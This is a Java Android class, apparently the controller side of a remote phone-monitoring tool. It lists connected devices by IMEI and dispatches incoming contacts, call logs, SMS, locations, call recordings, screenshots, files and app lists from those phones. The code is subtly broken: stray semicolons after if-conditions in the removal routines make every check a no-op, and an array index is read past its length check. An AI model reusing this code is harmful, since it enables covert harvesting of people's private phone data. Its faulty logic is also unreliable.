package com.app.CClient.Tool;


import android.os.Bundle;
import android.os.Handler;
import android.os.Message;

import com.lclient.SocketBase.LManagerHandle;

import java.util.List;


public class LMainMangerHandle extends LManagerHandle {
    public static List<String> m_strList;

    public Handler m_hFileMsghandle = null;             //用于下载文件的消息句柄

    public Handler m_hMainActivityhandle = null;             //主界面的消息句柄
    public Handler m_hAddressBookActivityhandle = null;      //电话簿
    public Handler m_hPhoneLoghandle = null;      //通话记录
    public Handler m_hMessagehandle = null;      //短信记录
    public Handler m_hResterctehandle = null;      //功能限制
    public Handler m_hApplicationhandle = null;      //应用管理
    public Handler m_hFilehandle     = null;      //文件管理
    public Handler m_hRecodehandle   = null;
    public Handler m_hCatchScreenhandle   = null;    //截屏设置

    public Handler m_hLocationhandle     = null;      //定位管理

    void OnAddtoList(String strUserID, String strMsg) {
        //解析字符串
        String strExtern = strMsg;
        String strMsgArray[] = strExtern.split("\\|");
        if (strMsgArray.length > 4) {
            OnLineUsers onUser = new OnLineUsers();
            onUser.setConnectStat(strUserID);
            onUser.setUserIMEI(strMsgArray[1]);      //IMEI码

            //手机名称
            String strTemp = strMsgArray[0];  //"手机名称："
            onUser.setPhoneName(strTemp);

            //1为Imei码

            //版本
            strTemp = strMsgArray[2];   //"软件版本："
            onUser.setVersion(strTemp);
            //版本
            strTemp = strMsgArray[3]; //"安卓版本："
            onUser.setAndroidVersion(strTemp);

            if (strMsgArray[4].equals("1") == true) {
                strTemp = "Wifi";
            } else {
                strTemp = "Gprs";
            }
            onUser.setNetState(strTemp);

            strTemp = strMsgArray[5];
            onUser.setState(strTemp);

            //创建对象集合
            OnLineUserAdapter.g_listMess.add(onUser);

            Message msg = new Message();
            msg.what = MainActivity.MAINACTIVITE_ADDTOLIST;
            m_hMainActivityhandle.sendMessage(msg);

            SystemInfo.g_strOnlineID = strMsgArray[6];

        }
    }

    //发送指定的心跳
    public void SendHeart(String strUser, char chStact, char chStact2)
    {
        StringBuffer strBuffer = new StringBuffer();
        strBuffer.insert(0,chStact2);
        strBuffer.insert(0,chStact);
        SendMsg(strUser,strBuffer.toString());
    }
    //找到列表中的条目，删除掉
    void OnRemveFromList(String strUserID)
    {
        int nCount =  OnLineUserAdapter.g_listMess.size();
        for(int i = 0; i < nCount; i++){
            OnLineUsers pUserMsg = (OnLineUsers) OnLineUserAdapter.g_listMess.get(i);
            if(pUserMsg.getConnectStat().equals(strUserID));
            {
                OnLineUserAdapter.g_listMess.remove(i);
                break;
            }
        }

        Message msg = new Message();
        msg.what = MainActivity.MAINACTIVITE_ADDTOLIST;
        m_hMainActivityhandle.sendMessage(msg);
    }

    //把相应的用户状态置位在线状态
    boolean OnSetUserStat(String strUserID)
    {
        int nCount =  OnLineUserAdapter.g_listMess.size();
        for(int i = 0; i < nCount; i++){
            OnLineUsers pUserMsg = (OnLineUsers) OnLineUserAdapter.g_listMess.get(i);
            if(pUserMsg.getConnectStat().equals(strUserID))
            {
                pUserMsg.bIsOnLine = true;
                return true;
            }
        }
        return false;
    }
    //清除无用的条目
    void TestOffLineUser()
    {
        new Thread() {
            @Override
            public void run() {
                //循环登录
                while (true) {

                    SystemInfo.Sleep(1000 * 60);
                    int nCount =  OnLineUserAdapter.g_listMess.size();
                    for(int i = 0; i < nCount; i++){
                        OnLineUsers pUserMsg = (OnLineUsers) OnLineUserAdapter.g_listMess.get(i);
                        if(pUserMsg.bIsOnLine ==false);
                        {
                            OnLineUserAdapter.g_listMess.remove(i);
                            break;
                        }
                    }

                    Message msg = new Message();
                    msg.what = MainActivity.MAINACTIVITE_ADDTOLIST;
                    m_hMainActivityhandle.sendMessage(msg);
                }
            }
        }.start();
    }


    @Override
    public void OnFile(String strUserID, String strMsg) {
              if (m_hFileMsghandle != null)
              {
                  Message msg = new Message();
                  Bundle data = new Bundle();
                  data.putString("msg", strMsg);
                  msg.setData(data);
                  msg.what = LManagerHandle.HANDLE_FILEMSG;
                  m_hFileMsghandle.sendMessage(msg);
              }
    }

    @Override
    public void OnMsg(String strUserID, String strMsg) {
        try {
            //第一个为数据头
            char chStact = strMsg.charAt(0);
            char chStact2 = strMsg.charAt(1);
            switch (chStact) {
                // 返回主控端上的列表信息
                case SystemInfo.TOKEN_ONINE_MSG: {
                    if (OnSetUserStat(strUserID) == false)    //先判断有没有
                    {
                        StringBuffer strBuffer= new StringBuffer(strMsg);
                        strBuffer.deleteCharAt(0);
                        strBuffer.deleteCharAt(0);
                        strMsg = strBuffer.toString();
                        OnAddtoList(strUserID,strMsg);  //加入到列表中
                        SystemInfo.g_lManagerHandle.SendHeart(strUserID, SystemInfo.COMMAND_ONINE_MSG,
                                SystemInfo.COMMAND_ONINE_MSG);
                    }
                }
                break;
                //心跳
                case SystemInfo.TOKEN_ONINE_HEART:
                {
                    if (OnSetUserStat(strUserID))
                    {
                        //如果查到了就回复一个心跳包
                        SystemInfo.g_lManagerHandle.SendHeart(strUserID, SystemInfo.COMMAND_ONINE_HEART,
                                SystemInfo.COMMAND_ONINE_HEART);
                    }
                }break;
                //电话簿
                case SystemInfo.TOKEN_PHONEBOOK_START:
                {
                      if (m_hAddressBookActivityhandle != null)
                      {
                          Message msg = new Message();
                          Bundle data = new Bundle();
                          data.putString("msg", strMsg);
                          msg.setData(data);
                          msg.what = LManagerHandle.HANDLE_ADDMSG;
                          m_hAddressBookActivityhandle.sendMessage(msg);
                      }
                }break;
                //通话记录
                case SystemInfo.TOKEN_PHONELOG_START:
                {
                    if (m_hPhoneLoghandle != null)
                    {
                        Message msg = new Message();
                        Bundle data = new Bundle();
                        data.putString("msg", strMsg);
                        msg.setData(data);
                        msg.what = LManagerHandle.HANDLE_ADDMSG;
                        m_hPhoneLoghandle.sendMessage(msg);
                    }
                }break;
                //短信
                case SystemInfo.TOKEN_MESSAGE_START:
                {
                    if (m_hMessagehandle != null)
                    {
                        Message msg = new Message();
                        Bundle data = new Bundle();
                        data.putString("msg", strMsg);
                        msg.setData(data);
                        msg.what = LManagerHandle.HANDLE_ADDMSG;
                        m_hMessagehandle.sendMessage(msg);
                    }
                }break;
                //限制
                case SystemInfo.TOKEN_RESTERCT_START:
                {
                    if (m_hResterctehandle != null)
                    {
                        Message msg = new Message();
                        Bundle data = new Bundle();
                        data.putString("msg", strMsg);
                        msg.setData(data);
                        msg.what = LManagerHandle.HANDLE_ADDMSG;
                        m_hResterctehandle.sendMessage(msg);
                    }
                }break;

                //应用程序
                case SystemInfo.TOKEN_APPLICATION_START:
                {
                    if (m_hApplicationhandle != null)
                    {
                        Message msg = new Message();
                        Bundle data = new Bundle();
                        data.putString("msg", strMsg);
                        msg.setData(data);
                        msg.what = LManagerHandle.HANDLE_ADDMSG;
                        m_hApplicationhandle.sendMessage(msg);
                    }
                }break;
                //文件管理
                case SystemInfo.TOKEN_FILE_START:
                {
                    if (m_hFilehandle != null)
                    {
                        Message msg = new Message();
                        Bundle data = new Bundle();
                        data.putString("msg", strMsg);
                        msg.setData(data);
                        msg.what = LManagerHandle.HANDLE_ADDMSG;
                        m_hFilehandle.sendMessage(msg);
                    }
                }break;

                //地理位置管理
                case SystemInfo.TOKEN_LOCATION_START:
                {
                    if (m_hLocationhandle != null)
                    {
                        Message msg = new Message();
                        Bundle data = new Bundle();
                        data.putString("msg", strMsg);
                        msg.setData(data);
                        msg.what = LManagerHandle.HANDLE_ADDMSG;
                        m_hLocationhandle.sendMessage(msg);
                    }
                }break;

                //通话
                case SystemInfo.TOKEN_RECODE_START:
                {
                    if (m_hRecodehandle != null)
                    {
                        Message msg = new Message();
                        Bundle data = new Bundle();
                        data.putString("msg", strMsg);
                        msg.setData(data);
                        msg.what = LManagerHandle.HANDLE_ADDMSG;
                        m_hRecodehandle.sendMessage(msg);
                    }
                }break;

                //抓图
                case SystemInfo.TOKEN_CATCHSCREEN_START:
                {
                    if (m_hCatchScreenhandle != null)
                    {
                        Message msg = new Message();
                        Bundle data = new Bundle();
                        data.putString("msg", strMsg);
                        msg.setData(data);
                        msg.what = LManagerHandle.HANDLE_ADDMSG;
                        m_hCatchScreenhandle.sendMessage(msg);
                    }
                }break;


            }
        } catch (Exception e) {
            String strMsg2 = e.toString();
        }

    }
}
